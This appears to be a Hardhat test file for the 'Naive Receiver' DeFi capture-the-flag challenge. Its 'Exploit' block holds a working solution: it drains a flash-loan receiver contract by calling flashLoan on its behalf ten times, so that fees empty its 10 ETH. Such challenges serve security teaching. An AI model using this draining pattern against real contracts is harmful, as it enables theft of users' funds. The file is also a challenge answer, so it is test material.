const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('[Challenge] Naive Receiver', function() {
    let deployer, user, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('100');
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);

        await deployer.sendTransaction({
            to: this.pool.address,
            value: ETHER_IN_POOL
        })

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(
            ETHER_IN_POOL
        );

        expect(
            await this.pool.fixedFee()
        ).to.be.equal(
            ethers.utils.parseEther('1')
        );

        await deployer.sendTransaction({
            to: this.receiver.address,
            value: ETHER_IN_RECEIVER
        });

        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal(
            ETHER_IN_RECEIVER
        )
    });

    it('Exploit', async function () {
        for ( i = 1; i <= 10; i++) {
            await this.pool.connect(attacker).flashLoan(this.receiver.address, String(ethers.utils.parseEther('0')));
            console.log(i, String(await ethers.provider.getBalance(this.receiver.address)));
        }
    });

    after(async function () {
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});